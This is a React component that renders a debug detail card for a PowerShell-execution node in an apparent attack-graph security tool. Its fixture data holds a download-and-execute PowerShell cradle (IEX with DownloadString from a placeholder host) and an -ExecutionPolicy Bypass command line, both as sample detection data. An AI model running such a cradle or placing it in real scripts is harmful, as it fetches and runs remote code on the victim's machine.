"use client";

import { Terminal } from "lucide-react";

import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from "@/shared/ui/card";
import { TooltipProvider } from "@/shared/ui/tooltip";

import { AttackGraphDetailCard } from "../components/attack-graph-detail-card";
import type { AttackGraphNodeModel } from "../model/core/attack-graph-data";
import { getAttackGraphNodePresentationKind } from "../model/node/attack-graph-node-types";

const POWERSHELL_EXECUTION_DETAIL_DEBUG_NODE: AttackGraphNodeModel = {
  id: "powershell_execution:debug:d0c951b3b2fe6bba106840972c7c904f:bc878528158017e0003a9a96f49dda01:script",
  key: "powershell_execution:debug:d0c951b3b2fe6bba106840972c7c904f:bc878528158017e0003a9a96f49dda01:script",
  entityType: "PowerShellExecution",
  displayName: "script.ps1",
  presentationKind: getAttackGraphNodePresentationKind("PowerShellExecution"),
  properties: {
    agent_id: "d0c951b3b2fe6bba106840972c7c904f",
    boot_time: "2026-04-21 13:10:00",
    content:
      "IEX (New-Object Net.WebClient).DownloadString('http://example.test/payload.ps1')",
    file_name: "C:\\Temp\\Script.ps1",
    occurred_at: "2026-04-21 13:11:00",
    process_command_line:
      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\Script.ps1",
    process_guid: "proc-powershell-1",
    script_fingerprint: "3f4d832e5f3dc3e92fb5ac94243e0af1",
    session_id: "10",
    tenant_id: "tenant-fixture",
    unique_id: "powershell-unique-1",
  },
};

export function AttackGraphPowerShellExecutionDetailDebugCard() {
  return (
    <Card className="relative min-h-[760px] overflow-hidden border-slate-200 bg-white shadow-sm">
      <CardHeader className="border-b border-slate-100 px-5 py-4">
        <div className="flex min-w-0 items-center gap-3">
          <div className="flex h-9 w-9 items-center justify-center rounded-md bg-cyan-700 text-white">
            <Terminal className="h-4 w-4" />
          </div>
          <div className="min-w-0">
            <CardTitle className="text-base font-semibold text-slate-900">
              PowerShellExecution Node Detail Debug
            </CardTitle>
            <div className="mt-1 text-xs text-slate-500">
              PowerShellExecution graph payload rendered by the detail config.
            </div>
          </div>
        </div>
      </CardHeader>
      <CardContent className="relative min-h-[700px] bg-slate-50 p-4">
        <TooltipProvider delayDuration={180}>
          <AttackGraphDetailCard
            item={{ kind: "node", node: POWERSHELL_EXECUTION_DETAIL_DEBUG_NODE }}
            className="absolute bottom-4 right-4 top-4"
          />
        </TooltipProvider>
      </CardContent>
    </Card>
  );
}
